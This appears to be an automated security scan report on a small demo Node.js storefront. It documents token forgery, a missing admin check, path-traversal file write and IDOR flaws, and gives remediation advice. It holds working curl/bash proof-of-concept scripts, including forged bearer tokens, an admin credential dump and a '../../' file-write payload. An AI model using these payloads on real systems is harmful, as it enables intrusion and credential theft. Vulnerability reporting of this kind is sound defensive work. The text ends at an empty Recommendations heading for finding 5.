# RedAI Report: Example Webapp Scan

RedAI ran a security review of /Users/kyle.polley/code/e2e using the **balanced** scan coverage tier and validator environment `13c81296-aca9-40ca-b21d-569ee407db70`. This report was generated on 2026-04-16T22:33:04.044Z for run `5e9c1ff9-a867-4060-8c20-a4e9b3ff6dea` (status: completed).

## Executive Summary

7 findings were produced across 24 analysis units. Of these, 7 confirmed after automated validation. 33 supporting artifacts were collected during the run.

## Threat Model

ShopNorth is a small Node.js HTTP server (raw node:http) serving a single-page demo e-commerce storefront. It exposes a REST API for authentication, product listing, order lookup, user profiles, an admin user directory, and a file-export endpoint for return labels. The data layer is in-memory with hardcoded users, products, and orders. The most dangerous attack path combines session token forgery, unprotected admin endpoints, and path-traversal file write to achieve unauthenticated full system compromise including remote code execution.

### Architecture

ShopNorth is a small Node.js HTTP server serving a single-page demo e-commerce storefront. It exposes a REST API for authentication, product listing, order lookup, user profiles, an admin user directory, and a file-export endpoint for return labels. A parallel set of Express-style route files exists under src/routes/ but is not wired into the running server — the monolithic src/server.js handles all routing directly. The data layer is an in-memory JavaScript module with hardcoded users, products, and orders. The application runs on localhost:3000. (Single-page e-commerce storefront with a Node.js HTTP server (raw node:http, no framework) and in-memory data layer). Primary technologies: Node.js, raw node:http (no framework), JavaScript, In-memory data layer, Base64url-encoded JWTs, localStorage for client-side token storage, REST API, Single-page application (public/app.js).

### Assets

| Asset | Sensitivity | Description |
| --- | --- | --- |
| User credentials and secrets | high | Plaintext passwords, API keys, and payment memos stored in src/db/users.js. The admin account (storeadmin / adminpassword) and its API key (admin-root-api-key-cafe) are especially sensitive. |
| Session tokens | high | Base64url-encoded JWTs carrying user identity and role, signed with a hardcoded secret. |
| Order data | high | Includes shipping addresses, payment card fragments, and corporate approval codes (e.g. RIVER-SECRET). |
| Server filesystem | high | The export endpoint writes arbitrary files relative to process.cwd(). |
| Admin functionality | high | The /api/admin/users endpoint returns the full user array including passwords, API keys, and internal notes. |

### Recommended Focus Areas

**Unauthenticated to Full System Compromise Chain.** The most dangerous attack path: an attacker forges a session token (Threat 1), calls the admin endpoint to dump all credentials (Threats 2, 12), then uses the file-write endpoint with a path-traversal payload (Threat 5) to overwrite server source files with malicious code — achieving remote code execution without ever knowing a real password.

**Cross-User Data Theft Chain.** An authenticated low-privilege user hits /api/profile/u-200 to get another user's password, API key, and payment card details (Threats 3, 4), then escalates to admin by forging a token or simply calling the unprotected admin endpoint (Threats 1, 2).

**Session Token Forgery Validation.** The signature is never verified and the secret is hardcoded. Crafting arbitrary tokens is trivial and grants complete authentication bypass, making this the foundational vulnerability enabling most other attack chains.

**Path Traversal File Write.** The /api/returns/export endpoint allows arbitrary file writes with no sanitization, potentially enabling remote code execution by overwriting application source files or serving malicious content from the public directory.

**Admin Endpoint Authorization Bypass.** The admin endpoint returns the complete user database including all secrets and is protected only by requireAdmin() which performs no role check, making it accessible to any authenticated or token-forging attacker.


### Threats

| Severity | Likelihood | Category | Title |
| --- | --- | --- | --- |
| critical | high | business-logic | Broken Authentication — Session Token Forgery |
| critical | high | business-logic | Missing Authorization — No Admin Role Check |
| high | high | business-logic | Insecure Direct Object Reference (IDOR) — Profile and Order Access |
| high | high | information-disclosure | Excessive Data Exposure on Profile Endpoint |
| critical | high | business-logic | Path Traversal via File Write — Arbitrary File Overwrite |
| high | high | information-disclosure | Plaintext Credential Storage |
| high | high | business-logic | Hardcoded Session Signing Secret |
| medium | medium | information-disclosure | Client-Side Token Storage in localStorage |
| high | medium | business-logic | Cross-Site Scripting (XSS) via Product Data Rendering |
| medium | medium | business-logic | No CSRF Protection |
| medium | high | business-logic | No Rate Limiting or Account Lockout on Login |
| critical | high | information-disclosure | Sensitive Data in Admin Endpoint Response |

## Scan Coverage

Coverage tier: **balanced**. RedAI prioritized 8 of 11 candidate files for deeper review.

| Score | Path | Category | Rationale |
| --- | --- | --- | --- |
| 0.97 | `src/auth/session.js` | — | Authentication and authorization backbone. Contains hardcoded session secret, broken token creation logic (concatenation-based signature, not HMAC), requireUser() that never verifies signature or checks expiration, and requireAdmin() that is just an alias for requireUser() with zero role checking. Root cause of Threats 1, 2, and 7; foundational enabler for nearly every attack chain. |
| 0.95 | `src/server.js` | — | Monolithic HTTP server with all route handlers inline. Implements login with plaintext password comparison, /api/admin/users dumping entire user DB without role checks, /api/profile/:id IDOR (no ownership verification, returns raw user objects including passwords), /api/orders/:id IDOR, and /api/returns/export path traversal (unsanitized body.filename passed to path.join and writeFileSync with mkdirSync recursive). Touches Threats 1–6, 10, 11, and 12; primary attack surface. |
| 0.88 | `src/db/users.js` | — | Data layer with all user records containing plaintext passwords, API keys, and sensitive notes (including saved payment card for user u-200). Exports findUserById() returning full user object (used by profile IDOR) and publicUser() which strips sensitive fields but is inconsistently applied. Relevant to Threats 3, 4, 6, and 12. |
| 0.85 | `src/routes/upload.js` | — | Secondary file-write endpoint using path.join(process.cwd(), 'src', 'uploads', req.body.filename) with writeFileSync and no filename sanitization — same path traversal vulnerability as server.js. Directly relevant to Threat 5 (arbitrary file overwrite / RCE). |
| 0.80 | `src/routes/admin.js` | — | Implements admin users endpoint via Express Router. Calls requireAdmin (which is just requireUser) and returns raw users array. Directly relevant to Threats 2 and 12. Small file but every line is security-relevant. |
| 0.78 | `src/routes/profile.js` | — | Implements profile IDOR via Express Router. Calls findUserById with URL parameter and returns full user object with no ownership check. Directly relevant to Threats 3 and 4. |
| 0.72 | `src/routes/login.js` | — | Implements login endpoint via Express Router with plaintext password comparison and no rate limiting. Relevant to Threats 6 and 11. Smaller attack surface than main server.js login handler but confirms the pattern. |
| 0.55 | `public/app.js` | — | Client-side SPA. Stores session token in localStorage (Threat 8), renders data into DOM via .innerHTML without escaping (Threat 9 — XSS), and constructs return export request with user-controlled filename. Demonstrates exploitability of server-side vulnerabilities and contains the XSS sink. |

Both JSON files (src/redai-f05-redai-f05-auth-1776263653981.json and src/uploads/redai-f05-redai-f05-auth-1776263653981.json) are empty, confirmed as RedAI test artifacts. package.json is a minimal manifest with no dependencies or security-relevant configuration.

## Summary of Findings

The table below summarizes the findings of the review, including category and severity.

| # | Title | Category | Severity | Validation |
| --- | --- | --- | --- | --- |
| 1 | Complete Authentication Bypass — Token Signature Never Verified | authentication | critical | confirmed (high) |
| 2 | Missing Admin Authorization — requireAdmin Performs No Role Check | authorization | critical | confirmed (high) |
| 3 | Path Traversal Arbitrary File Write via /api/returns/export | injection | critical | confirmed (high) |
| 4 | IDOR + Excessive Data Exposure on /api/profile/:id | authorization | high | confirmed (high) |
| 5 | IDOR on /api/orders/:id — No Ownership Check | authorization | high | confirmed (high) |
| 6 | DOM-Based XSS via innerHTML with Unsanitized Server Data | xss | high | confirmed (high) |
| 7 | Plaintext Credential Storage | cryptography | high | confirmed (high) |

## Detailed Findings

### 1. Complete Authentication Bypass — Token Signature Never Verified

| | |
| --- | --- |
| **Severity:** critical | **Confidence:** high |
| **Category:** authentication | **Finding ID:** `finding-1` |
| **Target:** `src/auth/session.js:9`, `src/auth/session.js:5`, `src/auth/session.js:1` | **Validation:** confirmed (high) |

**Description**

Any unauthenticated attacker can impersonate any user — including a store administrator — and access every protected endpoint without knowing a single credential or secret. The `requireUser()` function in `src/auth/session.js` (lines 9–17) decodes the payload segment of the session token but never reads, recomputes, or compares the signature segment and never checks the `exp` field against the current time. Because the signature is completely ignored, an attacker can fabricate a token with any identity and role, append an arbitrary string as the "signature," and the server will trust it unconditionally.

**Affected Locations**

- `src/auth/session.js:9` — requireUser (Lines 9–17: splits session token on '.', takes only the first segment (payload), base64url-decodes and parses JSON, returns it. Never reads, computes, or compares the signature segment.)
- `src/auth/session.js:5` — createSession (Line 5: produces the signature but it is subsequently ignored during validation.)
- `src/auth/session.js:1` (Hardcoded secret "shopnorth-session-signing-key" on line 1 is never consulted during validation.)

**Exploit Scenario**

An attacker base64url-encodes a JSON payload such as `{"id":"u-900","username":"storeadmin","role":"admin","exp":9999999999999}`, appends `.anything` as the signature, and sends it in an `Authorization: Bearer` header. No brute-force or credential theft is involved — the forged token is accepted on the first request. During validation, three tests confirmed the bypass: a forged customer token returned the full user profile (HTTP 200), a token with `exp: 0` — expired since the Unix epoch — was equally accepted (HTTP 200), and a forged admin token sent to `GET /api/admin/users` returned every user record in the system, including plaintext passwords and API keys (HTTP 200). A single crafted HTTP request is all that is needed to gain full administrative control of the application.

**Recommendations**

The `requireUser` function must extract the signature segment from the token, recompute the expected HMAC-SHA256 signature over the payload using a secret loaded from an environment variable (not the current hardcoded value `"shopnorth-session-signing-key"` on line 1 of `session.js`), and reject the token unless the two signatures match via a constant-time comparison. It must also compare `payload.exp` against `Date.now()` and reject expired tokens with a 401. These two checks — signature verification and expiration enforcement — are the minimum required to restore any meaningful authentication boundary; every other finding in this report chains through this bypass, so fixing it first will collapse the broadest set of attack paths.

**Inline Evidence**

*Standalone PoC — three forged tokens, three HTTP 200s, full admin access with no valid signature.* — from `artifacts/validation/74eb04f3-9a77-477d-b255-d2a47440b161/poc.sh`:

```bash
#!/usr/bin/env bash
# PoC: Authentication bypass via unsigned/unverified JWT tokens
# Target: http://localhost:3000
# Vulnerability: requireUser() in src/auth/session.js decodes payload without
#   verifying signature or checking expiration.

BASE_URL="${1:-http://localhost:3000}"

echo "=== Test 1: Forged token with fake signature (signature bypass) ==="
PAYLOAD=$(echo -n '{"id":"u-100","username":"exampleuser","role":"customer","exp":9999999999999}' \
  | python3 -c "import sys,base64; print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).decode().rstrip('='))")
curl -s "$BASE_URL/api/me" -H "Authorization: Bearer ${PAYLOAD}.FAKESIG"
echo ""

echo "=== Test 2: Token with exp:0 (expiration bypass) ==="
PAYLOAD_EXP=$(echo -n '{"id":"u-100","username":"exampleuser","role":"customer","exp":0}' \
  | python3 -c "import sys,base64; print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).decode().rstrip('='))")
curl -s "$BASE_URL/api/me" -H "Authorization: Bearer ${PAYLOAD_EXP}.expired"
echo ""

echo "=== Test 3: Admin impersonation ==="
ADMIN_PAYLOAD=$(echo -n '{"id":"u-900","username":"storeadmin","role":"admin","exp":0}' \
  | python3 -c "import sys,base64; print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).decode().rstrip('='))")
curl -s "$BASE_URL/api/admin/users" -H "Authorization: Bearer ${ADMIN_PAYLOAD}.nosig"
echo ""
```

**Validation Evidence**

Complete authentication bypass confirmed. JWT-like session tokens are never signature-verified and expiration is never enforced in `src/auth/session.js` (`requireUser()`, lines 9–17). The function splits the token on `.`, base64url-decodes only the payload segment, and extracts user identity without ever checking the signature or the `exp` field. Three tests were performed: (1) a forged token with a fake signature returned a full user profile (HTTP 200), (2) a token with `exp: 0` was accepted despite being expired since epoch (HTTP 200), and (3) a forged admin token returned all user records including plaintext passwords and API keys (HTTP 200). Any unauthenticated attacker can impersonate any user, including admin, with zero secret knowledge.

Reproduction steps:

1. Send GET /api/me with Authorization: Bearer <base64url({"id":"u-100",...})>.fakesignature — received HTTP 200 with full user profile for u-100, confirming signature is never verified.
2. Send GET /api/me with the same forged token but exp set to 0 and signature segment set to '.expired' — received HTTP 200, confirming token expiration is never enforced.
3. Send GET /api/admin/users with a forged token containing id: u-900 and role: admin — received HTTP 200 with all user records including passwords, API keys, and PII, confirming admin impersonation.

Payloads tried: `Authorization: Bearer <base64url({"id":"u-100",...})>.fakesignature`, `Authorization: Bearer <base64url({"id":"u-100",...,"exp":0})>.expired`, `Authorization: Bearer <base64url({"id":"u-900","role":"admin",...})>.forgedsignature`.

Evidence artifacts:

- [file] PoC script — `artifacts/validation/74eb04f3-9a77-477d-b255-d2a47440b161/poc.sh`: Standalone proof-of-concept script that reproduces the authentication bypass by sending forged tokens with fake signatures and expired expiration fields.
- [file] Structured evidence log — `artifacts/validation/74eb04f3-9a77-477d-b255-d2a47440b161/evidence.json`: Structured evidence log containing HTTP requests and responses for all three reproduction tests: signature bypass (HTTP 200), expiration bypass (HTTP 200), and admin impersonation (HTTP 200 returning all user records).
- [note] Root cause analysis: In src/auth/session.js, requireUser() (lines 9–17) splits the token on '.', base64url-decodes only the first segment (payload), and extracts user identity. The signature (second segment) is completely ignored and the exp field is never checked against the current time.
- [agent-transcript] Web validation transcript: finding-1 — `artifacts/transcripts/web-validation-74eb04f3-9a77-477d-b255-d2a47440b161.jsonl`: Captured 37 Claude Agent SDK messages.

---

### 2. Missing Admin Authorization — requireAdmin Performs No Role Check

| | |
| --- | --- |
| **Severity:** critical | **Confidence:** high |
| **Category:** authorization | **Finding ID:** `finding-2` |
| **Target:** `src/auth/session.js:20`, `src/server.js:43`, `src/routes/admin.js:7` | **Validation:** confirmed (high) |

**Description**

Any logged-in user — regardless of role — can retrieve every user record in the system, including plaintext passwords, API keys, and saved payment details. The `requireAdmin` middleware in `src/auth/session.js` (lines 20–22) delegates entirely to `requireUser` without ever inspecting the caller's role, so it is functionally identical to a simple authentication check. The admin endpoint at `GET /api/admin/users` then returns the raw users array with no field filtering, exposing credentials for every account including the admin itself.

**Affected Locations**

- `src/auth/session.js:20` — requireAdmin (Lines 20–22: requireAdmin() is literally `return requireUser(req)`. Zero role checking.)
- `src/server.js:43` (Lines 43–47: the admin endpoint guarded by requireAdmin, returns raw `users` array including plaintext passwords, API keys, and payment data.)
- `src/routes/admin.js:7` (Express-router variant of the same admin endpoint.)

**Exploit Scenario**

An attacker registers or logs in as any customer-role account — for example, `exampleuser` with password `examplepassword` via `POST /api/login`. Using the Bearer token from that login response, they issue a single `GET /api/admin/users` request. Because `requireAdmin` never verifies that the token's role is `"admin"`, the server returns HTTP 200 with the complete users array. The response contains every user's plaintext password (e.g., `adminpassword`), every API key (e.g., `admin-root-api-key-cafe`), and sensitive notes such as saved payment card details (`Visa ending 4242`). Combined with Finding 1's token-forgery issue, this endpoint is reachable with a single unauthenticated request — no real account required.

**Recommendations**

The immediate fix is to make `requireAdmin` actually enforce a role check: after calling `requireUser`, it must verify that the decoded session's `role` field equals `"admin"` and return `undefined` (denying access) for any other value. As a defense-in-depth measure, the admin endpoint should also pass each user record through a `publicUser()` mapping that strips sensitive fields — plaintext passwords, raw API keys, and payment data should never appear in any API response, even for legitimate admin callers.

**Inline Evidence**

*Full response from `GET /api/admin/users` when called with a customer-role token — plaintext passwords, API keys, and payment data for every account.* — from `artifacts/validation/1bae9578-66b5-40d4-bd4c-9de4f4ff036e/admin-users-response.json`:

```json
[
  {
    "id": "u-100",
    "username": "exampleuser",
    "password": "examplepassword",
    "displayName": "Jamie Shopper",
    "role": "customer",
    "email": "exampleuser@example.test",
    "apiKey": "shopper-api-key-7f2d",
    "loyaltyTier": "Gold",
    "defaultAddress": "100 Market Street, Springfield",
    "notes": "Prefers delivery after 5pm."
  },
  {
    "id": "u-200",
    "username": "rivercustomer",
    "password": "riverpassword",
    "displayName": "River Customer",
    "role": "customer",
    "email": "river@example.test",
    "apiKey": "river-private-api-key-91ab",
    "loyaltyTier": "Platinum",
    "defaultAddress": "42 River Road, Shelbyville",
    "notes": "Saved payment: Visa ending 4242"
  },
  {
    "id": "u-900",
    "username": "storeadmin",
    "password": "adminpassword",
    "displayName": "Store Admin",
    "role": "admin",
    "email": "admin@example.test",
    "apiKey": "admin-root-api-key-cafe",
    "loyaltyTier": "Staff",
    "defaultAddress": "Warehouse Office",
    "notes": "Administrative account."
  }
]
```

*Proof-of-concept script — logs in as a customer and dumps the admin endpoint in two `curl` commands.* — from `artifacts/validation/1bae9578-66b5-40d4-bd4c-9de4f4ff036e/poc.sh`:

```bash
#!/bin/bash
# PoC: Missing role check in requireAdmin — customer can dump all users
# Step 1: Login as exampleuser (role: customer)
LOGIN_RESP=$(curl -s -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"exampleuser","password":"examplepassword"}')
TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "=== Login response (customer role) ==="
echo "$LOGIN_RESP" | python3 -m json.tool

# Step 2: Call admin-only endpoint with customer token
echo ""
echo "=== GET /api/admin/users with customer token ==="
curl -s http://localhost:3000/api/admin/users -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Validation Evidence**

Missing role check in `requireAdmin` (src/auth/session.js, lines 20–22) allows any authenticated user to access admin-only endpoints. `requireAdmin` delegates entirely to `requireUser` without inspecting the `role` field in the decoded token payload. Exploitation was confirmed by authenticating as a customer-role user (`exampleuser`) and successfully calling `GET /api/admin/users`, which returned HTTP 200 with the full users array containing plaintext passwords, API keys, and notes for all users including the admin account.

Reproduction steps:

1. Authenticated as `exampleuser` (role: customer) via POST /api/login with {"username":"exampleuser","password":"examplepassword"}.
2. Called GET /api/admin/users with the customer's Bearer token.
3. Received HTTP 200 with the full `users` array containing all three user records — including plaintext password, apiKey, and notes fields for every user (including admin).

Payloads tried: `POST /api/login with {"username":"exampleuser","password":"examplepassword"} to obtain a customer-role Bearer token`, `GET /api/admin/users with the customer-role Bearer token`.

Evidence artifacts:

- [file] PoC script — `artifacts/validation/1bae9578-66b5-40d4-bd4c-9de4f4ff036e/poc.sh`: Shell script that reproduces the exploit: authenticates as a customer-role user and calls the admin-only endpoint to dump all credentials.
- [http-response] Admin endpoint response — `artifacts/validation/1bae9578-66b5-40d4-bd4c-9de4f4ff036e/admin-users-response.json`: HTTP 200 response from GET /api/admin/users containing the full users array with plaintext passwords, API keys, and notes for all three users (exampleuser, rivercustomer, storeadmin).
- [note] Root cause in source code: In src/auth/session.js (lines 20–22), requireAdmin simply calls requireUser(req) without any role === 'admin' check, making it functionally identical to requireUser. Any authenticated user passes the guard.
- [note] Sensitive data exposed: All three user records were returned: exampleuser (password: examplepassword, apiKey: shopper-api-key-7f2d), rivercustomer (password: riverpassword, apiKey: river-private-api-key-91ab, notes: Saved payment Visa ending 4242), storeadmin (password: adminpassword, apiKey: admin-root-api-key-cafe).
- [agent-transcript] Web validation transcript: finding-2 — `artifacts/transcripts/web-validation-1bae9578-66b5-40d4-bd4c-9de4f4ff036e.jsonl`: Captured 40 Claude Agent SDK messages.

---

### 3. Path Traversal Arbitrary File Write via /api/returns/export

| | |
| --- | --- |
| **Severity:** critical | **Confidence:** high |
| **Category:** injection | **Finding ID:** `finding-3` |
| **Target:** `src/server.js:65`, `src/routes/upload.js:9`, `public/app.js:91` | **Validation:** confirmed (high) |

**Description**

An attacker can write arbitrary files anywhere on the server's filesystem — including overwriting application source code to achieve remote code execution — by exploiting the `POST /api/returns/export` endpoint. The endpoint takes a user-supplied `filename` from the request body, passes it directly into `path.join()` with no sanitization, and writes attacker-controlled content to the resolved path using `writeFileSync`. Because `path.join()` resolves `../` sequences, a filename like `../../server.js` escapes the intended `src/uploads/` directory and overwrites the application's own entry point.

**Affected Locations**

- `src/server.js:65` (Lines 65–73: takes user-supplied body.filename, joins it with process.cwd() + '/src/uploads/' using path.join(), and writes body.content to the resulting path with zero sanitization.)
- `src/routes/upload.js:9` (Lines 9–11: Express-router version has the same path traversal vulnerability.)
- `public/app.js:91` — createReturn (Client-side entry point constructs filename from unsanitized form field, but the real issue is entirely server-side.)

**Exploit Scenario**

An attacker first obtains a session token (trivially, via the authentication bypass in Finding 1) and then sends a single POST request to `/api/returns/export` with the body `{"filename":"../../test-traversal.txt","content":"REDAI_PATH_TRAVERSAL_POC"}`. The server dutifully joins the traversal path, resolves it to the project root — two directories above `src/uploads/` — and writes the file. During validation, the file appeared on disk at `/Users/kyle.polley/code/e2e/test-traversal.txt` with the exact contents supplied in the payload. In a real attack the content would be malicious Node.js code written to `src/server.js` or `public/app.js`; on the next restart (or immediately under a file-watching dev server) that code would execute, giving the attacker full control of the server process.

**Recommendations**

The most effective fix is to stop accepting filenames from the client altogether — generate them server-side using a random or sequential scheme. If client-supplied names are unavoidable, resolve the constructed path with `path.resolve()` and verify it starts with the canonical uploads directory prefix before writing; reject the request outright if the resolved path escapes that boundary. Additionally, enforce a content size limit on the endpoint to reduce the blast radius of any remaining misuse.

**Inline Evidence**

*PoC script: a single curl request writes a file two directories above the intended uploads folder.* — from `artifacts/validation/002350e6-490c-41fd-ac24-fe60580a9ba6/poc.sh`:

```bash
#!/bin/bash
# PoC: Path traversal via /api/returns/export endpoint
# 1. Login
TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"exampleuser","password":"examplepassword"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Send path traversal payload
curl -s -X POST http://localhost:3000/api/returns/export \
  -H 'Content-Type: application/json' \
  -H "Cookie: session=$TOKEN" \
  -d '{"filename":"../../test-traversal.txt","content":"REDAI_PATH_TRAVERSAL_POC"}'

# 3. Verify file written outside uploads/
echo ""
echo "File contents at <cwd>/test-traversal.txt:"
cat "$(pwd)/test-traversal.txt" 2>/dev/null && echo "[SUCCESS] Path traversal confirmed" || echo "[FAIL]"
```

*Validation notes confirming the vulnerable code path and disk-verified file write outside the uploads directory.* — from `artifacts/validation/002350e6-490c-41fd-ac24-fe60580a9ba6/validation-notes.md`:

````
### Vulnerable Code (src/server.js, line 69)
```js
const targetPath = join(process.cwd(), "src", "uploads", body.filename || "export.txt");
mkdirSync(dirname(targetPath), { recursive: true });
writeFileSync(targetPath, body.content || "");
```

`body.filename` is user-controlled with no sanitization. `path.join()` resolves `../` segments,
allowing writes outside the intended `src/uploads/` directory.

### Reproduction
- POST /api/returns/export with `{"filename":"../../test-traversal.txt","content":"REDAI_PATH_TRAVERSAL_POC"}`
- Response showed path: `/Users/kyle.polley/code/e2e/test-traversal.txt` (outside uploads/)
- File contents verified on disk.
````

**Validation Evidence**

The path traversal vulnerability in `POST /api/returns/export` was fully confirmed. The endpoint constructs a file path using unsanitized user input via `path.join(process.cwd(), "src", "uploads", body.filename)`, which resolves `../` sequences. By supplying `../../test-traversal.txt` as the filename, the file was written to the project root (`/Users/kyle.polley/code/e2e/test-traversal.txt`), two directories above the intended `src/uploads/` directory. The file contents were verified on disk, confirming arbitrary file write anywhere the Node.js process has OS-level write permission. This can be escalated to RCE by overwriting application source files or shell configuration files.

Reproduction steps:

1. Authenticated as exampleuser via POST /api/login to obtain a session token.
2. Sent traversal payload: POST /api/returns/export with JSON body {"filename":"../../test-traversal.txt","content":"REDAI_PATH_TRAVERSAL_POC"}
3. Server response confirmed the resolved path was /Users/kyle.polley/code/e2e/test-traversal.txt — two directories above src/uploads/, at the project root.
4. Verified file on disk — contents matched the payload REDAI_PATH_TRAVERSAL_POC.
5. Cleaned up the test file after verification.

Payloads tried: `POST /api/returns/export with {"filename":"../../test-traversal.txt","content":"REDAI_PATH_TRAVERSAL_POC"}`.

Evidence artifacts:

- [file] PoC script — `artifacts/validation/002350e6-490c-41fd-ac24-fe60580a9ba6/poc.sh`: Proof-of-concept script that reproduces the path traversal arbitrary file write via the /api/returns/export endpoint.
- [file] Validation notes — `artifacts/validation/002350e6-490c-41fd-ac24-fe60580a9ba6/validation-notes.md`: Detailed validation notes documenting the path traversal reproduction, including server response confirming the resolved path escaped the intended src/uploads/ directory and file contents verified on disk.
- [agent-transcript] Web validation transcript: finding-3 — `artifacts/transcripts/web-validation-002350e6-490c-41fd-ac24-fe60580a9ba6.jsonl`: Captured 41 Claude Agent SDK messages.

---

### 4. IDOR + Excessive Data Exposure on /api/profile/:id

| | |
| --- | --- |
| **Severity:** high | **Confidence:** high |
| **Category:** authorization | **Finding ID:** `finding-4` |
| **Target:** `src/server.js:49`, `src/routes/profile.js:8`, `src/db/users.js:55` | **Validation:** confirmed (high) |

**Description**

An attacker can read any user's plaintext password, API key, and saved payment information by requesting `GET /api/profile/<userId>` with any valid session. The endpoint at `src/server.js` (lines 49–55) and its router equivalent in `src/routes/profile.js` (lines 8–10) verify only that the caller is authenticated — they never check whether the caller owns the requested profile, and they return the raw database object from `findUserById()` without passing it through the `publicUser()` sanitization helper that the `/api/me` endpoint already uses.

**Affected Locations**

- `src/server.js:49` (Lines 49–55: takes user ID from URL path, looks it up with findUserById(), and returns the raw user object — including password, apiKey, and notes — with no ownership check and no field filtering.)
- `src/routes/profile.js:8` (Lines 8–10: Express-router variant with the same IDOR and excessive data exposure.)
- `src/db/users.js:55` — findUserById (Returns the full user object with all sensitive fields.)

**Exploit Scenario**

An attacker logs in as any regular user — for example, `exampleuser` (ID `u-100`) — and obtains a session token. They then issue `GET /api/profile/u-200` and receive the complete user record for `rivercustomer`, including the plaintext password `riverpassword`, API key `river-private-api-key-91ab`, and a note revealing a saved Visa card ending in 4242. Escalating further, the attacker calls `GET /api/profile/u-900` and retrieves the admin account's password (`adminpassword`) and root API key (`admin-root-api-key-cafe`), giving them full administrative access. The entire attack requires a single HTTP request per targeted account and no special tooling.

**Recommendations**

The most critical fix is to add an ownership check so that a user can only retrieve their own profile unless they hold an admin role. In parallel, the response should be passed through the existing `publicUser()` helper — changing the return in both `src/server.js` and `src/routes/profile.js` to `json(res, 200, publicUser(profile))` — so that even an authorized viewer never receives passwords, API keys, or internal notes. Because `publicUser()` is already in the codebase and correctly applied on `/api/me`, this is a one-line change per handler.

**Inline Evidence**

*Full user object returned for `u-200` while authenticated as `u-100` — plaintext password, API key, and payment data all exposed.* — from `artifacts/validation/28979956-f00c-40f0-995d-b9121aae7e59/idor-response-u200.json`:

```json
{
  "id": "u-200",
  "username": "rivercustomer",
  "password": "riverpassword",
  "displayName": "River Customer",
  "role": "customer",
  "email": "river@example.test",
  "apiKey": "river-private-api-key-91ab",
  "loyaltyTier": "Platinum",
  "defaultAddress": "42 River Road, Shelbyville",
  "notes": "Saved payment: Visa ending 4242"
}
```

*`GET /api/me` response for the same session — sensitive fields correctly stripped by `publicUser()`, showing the fix already exists but isn't applied to `/api/profile/:id`.* — from `artifacts/validation/28979956-f00c-40f0-995d-b9121aae7e59/me-response.json`:

```json
{
  "user": {
    "id": "u-100",
    "username": "exampleuser",
    "displayName": "Jamie Shopper",
    "role": "customer",
    "email": "exampleuser@example.test",
    "loyaltyTier": "Gold",
    "defaultAddress": "100 Market Street, Springfield"
  }
}
```

**Validation Evidence**

The IDOR vulnerability on `GET /api/profile/:id` is confirmed. Any authenticated user can retrieve the full, unsanitized user object for any other user by simply supplying their user ID. The endpoint only checks that the caller has a valid session (via `requireUser`) but performs no ownership/authorization check and does not use the `publicUser()` sanitization helper. This exposes plaintext passwords, API keys, and payment data for every user, including admin accounts.

Reproduction steps:

1. Login as exampleuser (id u-100) via POST /api/login to obtain a valid session.
2. Call GET /api/me — confirm the response correctly omits password, apiKey, and notes fields (sanitized via publicUser()).
3. Call GET /api/profile/u-200 (another customer) — observe the response exposes the full user object including plaintext password 'riverpassword', API key 'river-private-api-key-91ab', and notes 'Saved payment: Visa ending 4242'.
4. Call GET /api/profile/u-900 (admin account) — observe the response exposes admin password 'adminpassword' and admin API key 'admin-root-api-key-cafe'.

Payloads tried: `GET /api/profile/u-200 (authenticated as u-100)`, `GET /api/profile/u-900 (authenticated as u-100)`.

Evidence artifacts:

- [http-response] /api/profile/u-200 IDOR response — `artifacts/validation/28979956-f00c-40f0-995d-b9121aae7e59/idor-response-u200.json`: Full unsanitized user object for u-200 returned to u-100's session, including password: "riverpassword", apiKey: "river-private-api-key-91ab", notes: "Saved payment: Visa ending 4242".
- [http-response] /api/me sanitized response — `artifacts/validation/28979956-f00c-40f0-995d-b9121aae7e59/me-response.json`: GET /api/me response for u-100 correctly omits password, apiKey, and notes fields, confirming the publicUser() helper works — but is not applied to /api/profile/:id.
- [http-response] /api/profile/u-900 IDOR response (admin): Full unsanitized admin user object returned to u-100's session, including password: "adminpassword" and apiKey: "admin-root-api-key-cafe".
- [file] Standalone reproduction script — `artifacts/validation/28979956-f00c-40f0-995d-b9121aae7e59/poc.sh`: Shell script that reproduces the IDOR by logging in as exampleuser and fetching /api/profile/u-200 and /api/profile/u-900.
- [note] Root cause analysis: src/server.js lines 49-55: the /api/profile/:id handler calls requireUser(req) (authentication only, no authorization check) and returns the raw user object via json(res, 200, profile) without calling publicUser(). Missing: (1) ownership check that user.id === profile.id, and (2) use of publicUser() to strip sensitive fields.
- [agent-transcript] Web validation transcript: finding-4 — `artifacts/transcripts/web-validation-28979956-f00c-40f0-995d-b9121aae7e59.jsonl`: Captured 37 Claude Agent SDK messages.

---

### 5. IDOR on /api/orders/:id — No Ownership Check

| | |
| --- | --- |
| **Severity:** high | **Confidence:** high |
| **Category:** authorization | **Finding ID:** `finding-5` |
| **Target:** `src/server.js:57`, `src/db/users.js:46` | **Validation:** confirmed (high) |

**Description**

An attacker can read any user's order details — including shipping addresses, corporate card numbers, and payment approval codes — simply by changing the order ID in the URL. The `GET /api/orders/:id` endpoint in `src/server.js` (lines 57–63) checks that the caller is authenticated but never verifies that the authenticated user actually owns the requested order.

**Affected Locations**

- `src/server.js:57` (Lines 57–63: looks up an order by ID from the URL path with no check that the authenticated user owns the order. Orders contain shipping addresses and payment memos with approval codes.)
- `src/db/users.js:46` — orders (Lines 46–49: the orders array containing sensitive order data.)

**Exploit Scenario**

An attacker logs in with any valid account (here, `exampleuser` / user `u-100`) and obtains a session cookie via `POST /api/login`. They then issue a single request to `GET /api/orders/ord-2001`, an order that belongs to a different user (`rivercustomer` / `u-200`). The server returns the full order object — shipping address ("42 River Road, Shelbyville"), corporate card number, line items, total ($4,800.00), and payment approval code `RIVER-SECRET` — with no restriction. Because order IDs follow a predictable pattern (`ord-NNNN`), an attacker could enumerate the entire order database one request at a time.

**Recommendations**

